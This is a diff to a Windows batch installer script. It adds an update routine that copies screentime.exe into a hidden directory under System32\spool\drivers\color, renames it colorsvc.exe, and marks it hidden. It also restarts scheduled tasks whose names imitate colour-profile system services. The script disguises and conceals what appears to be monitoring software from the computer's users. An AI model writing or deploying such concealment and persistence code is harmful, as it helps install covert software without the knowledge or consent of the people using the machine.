@@ -34,6 +34,44 @@ echo.
 
 REM Hidden installation directory in system folder
 set INSTALL_DIR=%SystemRoot%\System32\spool\drivers\color\cache
+
+REM Check if already installed
+if exist "%INSTALL_DIR%\colorsvc.exe" (
+    echo [2/4] Program already installed - updating...
+    echo.
+    
+    REM Stop running tasks
+    echo Stopping running tasks...
+    schtasks /end /tn "ColorProfileSync" >nul 2>&1
+    schtasks /end /tn "ColorProfileService" >nul 2>&1
+    taskkill /f /im colorsvc.exe >nul 2>&1
+    timeout /t 2 /nobreak >nul
+    
+    REM Copy only executable
+    echo [3/4] Updating executable...
+    copy screentime.exe "%INSTALL_DIR%\colorsvc.exe" /Y >nul
+    attrib +h "%INSTALL_DIR%\colorsvc.exe"
+    echo Executable updated!
+    echo.
+    
+    REM Restart tasks
+    echo [4/4] Restarting tasks...
+    schtasks /run /tn "ColorProfileSync" >nul
+    schtasks /run /tn "ColorProfileService" >nul
+    
+    echo.
+    echo ================================
+    echo Update completed successfully!
+    echo ================================
+    echo.
+    echo Configuration files preserved.
+    echo Tasks restarted.
+    echo.
+    pause
+    exit /b 0
+)
+
+REM First time installation
 echo [2/6] Creating hidden directory...
 mkdir "%INSTALL_DIR%" 2>nul
 attrib +h "%INSTALL_DIR%"
